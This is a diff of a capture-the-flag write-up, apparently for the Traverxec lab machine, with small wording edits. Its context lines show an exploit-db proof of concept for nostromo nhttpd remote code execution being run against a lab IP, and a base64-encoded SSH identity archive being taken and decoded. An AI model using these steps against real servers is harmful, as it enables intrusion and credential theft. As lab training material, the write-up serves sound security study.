@@ -74,7 +74,7 @@ nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution            
 Shellcodes: No Result
 ```
 
-Go to the Exploit-db page for <a href="https://www.exploit-db.com/exploits/47837">nostromo 1.9.6 - Remote Code Execution</a>.
+Go to the Exploit-db page for <a href="https://www.exploit-db.com/exploits/47837">nostromo 1.9.6 - Remote Code Execution</a>.<br>
 We can download the POC code and the usage is quite simple.
 ```shell
 root@kali:~# python 47837.py 10.10.10.165 80 id
@@ -138,6 +138,7 @@ Look at `/var/nostromo/conf/nhttpd.conf`.<br>
 We can find the following 2:
 1. We have `.htpasswd` in `/var/nostromo/conf`. 
 2. We have an interesting parameter `homedirs_public:publc_www`
+
 ```shell:nhttpd.conf
 www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
 cat nhttpd.conf
@@ -242,7 +243,7 @@ FBvJDLdSdqgqkSnIi8wLRtDTBHhZ0NzFK+hKjaPxgW7LyAY1d3hic2jVzrrgBBD3sknSz4fT3irm
 e/PmzZs3b968efPmzZs3b968efPmzf8vfweR13qfACgAAA==
 ```
 
-Then, copy and paste the encoded text. Create a file `ssh-identity`.
+Then, copy and paste the encoded text. Create a file `ssh-identity` on the localhost.
 ```shell
 root@kali:~# cat ssh-identify 
 H4sIAANjs10AA+2YWc+jRhaG+5pf8d07HfYtV8O+Y8AYAzcROwabff/1425pNJpWMtFInWRm4uem
@@ -281,7 +282,7 @@ FBvJDLdSdqgqkSnIi8wLRtDTBHhZ0NzFK+hKjaPxgW7LyAY1d3hic2jVzrrgBBD3sknSz4fT3irm
 e/PmzZs3b968efPmzZs3b968efPmzf8vfweR13qfACgAAA==
 ```
 
-Decode the file extract files.
+Decode the archive and extract files.
 ```shell
 root@kali:~# cat ssh-identify | base64 -d > ssh-identify.tgz
 
